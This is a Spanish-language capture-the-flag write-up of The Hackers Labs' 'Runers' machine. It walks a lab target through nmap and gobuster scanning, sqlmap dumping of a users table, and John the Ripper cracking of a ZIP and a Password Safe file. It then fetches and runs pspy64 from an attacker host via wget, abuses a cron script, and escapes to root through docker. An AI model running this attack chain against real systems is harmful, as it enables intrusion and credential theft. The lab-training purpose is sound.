---
tags:
  - Cybersecurity
  - Labs
  - TheHackersLabs
  - Easy
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Ping|Ping]]
	- [[#Enumeración#Nmap|Nmap]]
	- [[#Enumeración#HTTP|HTTP]]
		- [[#HTTP#Fuzzing Web|Fuzzing Web]]
- [[#Explotación|Explotación]]
	- [[#Explotación#SQLi|SQLi]]
	- [[#Explotación#SHA-256|SHA-256]]
	- [[#Explotación#SSH 1|SSH 1]]
	- [[#Explotación#John The Ripper 1|John The Ripper 1]]
	- [[#Explotación#SSH 2|SSH 2]]
	- [[#Explotación#SSH 3|SSH 3]]
	- [[#Explotación#John The Ripper 2|John The Ripper 2]]
	- [[#Explotación#Escalada de Privilegios|Escalada de Privilegios]]

---
# Runers

![](Screenshots/runers.png)

> En este write-up se documenta la resolución paso a paso de la máquina **Runers** de [The Hackers Labs](https://labs.thehackerslabs.com/machine/76), clasificada como dificultad **Easy**. Se cubren las fases de **enumeración**, **explotación** y **escalada de privilegios**.

---
## Enumeración
### Ping

`ping -c 1 192.168.1.37`

![](Screenshots/Pasted%20image%2020251222120221.png)
### Nmap

`nmap -p- --open -sS --min-rate 5000 -sS -vvv -n -Pn 192.168.1.37 -oG allPorts`

![](Screenshots/Pasted%20image%2020251222120421.png)

`nmap -p22,80,2222 -sCV 192.168.1.37 -oN targeted`

![](Screenshots/Pasted%20image%2020251222120451.png)
### HTTP

`http://192.168.1.37/`

![](Screenshots/Pasted%20image%2020251222122818.png)
#### Fuzzing Web

`gobuster dir -u http://192.168.1.37 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,html,txt -t 64`

![](Screenshots/Pasted%20image%2020251222123320.png)

---
## Explotación
### SQLi

`sqlmap -u "http://192.168.1.37/post.php?id=2" --dbs`

![](Screenshots/Pasted%20image%2020251222123513.png)

`sqlmap -u "http://192.168.1.37/post.php?id=2" -D blog --tables`

![](Screenshots/Pasted%20image%2020251222123535.png)

`sqlmap -u "http://192.168.1.37/post.php?id=2" -D blog -T users --columns`

![](Screenshots/Pasted%20image%2020251222123610.png)

`sqlmap -u "http://192.168.1.37/post.php?id=2" -D blog -T users --columns --dump`

![](Screenshots/Pasted%20image%2020251222123646.png)
### SHA-256

[dCode](https://www.dcode.fr/cipher-identifier).

![](Screenshots/Pasted%20image%2020251222123828.png)

![](Screenshots/Pasted%20image%2020251222123848.png)

También se puede realizar con `John The Ripper` para descodificar las contraseñas.
### SSH 1

`ssh david@192.168.1.37 -p 2222`

![](Screenshots/Pasted%20image%2020251222180154.png)

`ls -la`

![](Screenshots/Pasted%20image%2020251222180235.png)

`cd .hidden`

`ls -l`

![](Screenshots/Pasted%20image%2020251222180321.png)

Nos descargamos el archivo en nuestra máquina local, mediante el comando: `scp -P 2222 david@192.168.1.37:/home/david/.hidden/credenciales.zip .`.
### John The Ripper 1

`zip2john credenciales.zip > hash.txt`

`john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

![](Screenshots/Pasted%20image%2020251222181357.png)

`unzip credenciales.zip`

Se obtiene un archivo `credenciales.xlsx`.

![](Screenshots/Pasted%20image%2020251222182125.png)
### SSH 2

`ssh maria@192.168.1.37 -p 2222`

![](Screenshots/Pasted%20image%2020251222182405.png)

Se descarga la herramienta [pspy64](https://github.com/DominicBreuker/pspy).

Para poder ver las tareas **CRON** que se ejecutan en la máquina víctima.

Se descarga en nuestra máquina.

Se mueve el archivo descargado al directorio actual.

`mv /home/manumore/Descargas/pspy64 .`

`python3 -m http.server 80`

Se descarga en la máquina victima y se dan permisos.

`wget [MÁQUINA_ATACANTE]/pspy64`

`chmod 777 pspy64`

Se ejecuta el archivo descargado.

`./pspy64`

Se observa una tarea **CRON**, en la ruta: `/opt/scripts/backup.sh`.

![](Screenshots/Pasted%20image%2020251222182743.png)

`cat /opt/scripts/backup.sh`

![](Screenshots/Pasted%20image%2020251222183253.png)

Se observa los permisos del archivo.

![](Screenshots/Pasted%20image%2020251222183321.png)

`vim backup.sh`

![](Screenshots/Pasted%20image%2020251222183533.png)

Se espera unos minutos.

`bash -p

![](Screenshots/Pasted%20image%2020251222183643.png)

Se encuentra un archivo llamado: `TODO_LIST.txt` en la ruta: `/root`.

`cat TODO_LIST.txt`

![](Screenshots/Pasted%20image%2020251222183809.png)
### SSH 3

`ssh ian@192.168.1.37 -p 22`

![](Screenshots/Pasted%20image%2020251222184259.png)

Se encuentra la **flag**: `user.txt`.

Se observa un archivo llamado: `miscredenciales.psafe3`, en la ruta `/home/elliot`.

Se descarga con `scp -P 22 ian@192.168.1.37:/home/elliot/miscredenciales.psafe3 .`.
### John The Ripper 2

`pwsafe2john miscredenciales.psafe3 > hash.txt`

`john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

![](Screenshots/Pasted%20image%2020251222185306.png)

Con pwsafe accedamos con el usuario y contraseña encontrados.

![](Screenshots/Pasted%20image%2020251222185319.png)
### Escalada de Privilegios

Se accede con **SSH**.

`ssh elliot@192.168.1.37 -p 22` o si tenemos la sesión anterior de **SSH**: `su elliot`

![](Screenshots/Pasted%20image%2020251222191825.png)

`id`

![](Screenshots/Pasted%20image%2020251222191952.png)

Se crea un contenedor con permisos de **root** en la bash.

`docker run -it -v /:/host/ alpine chroot /host/ bash`

![](Screenshots/Pasted%20image%2020251222192044.png)

La **flag** de **root** se encuentra en la ruta: `/root` con el nombre: `root.txt`.

---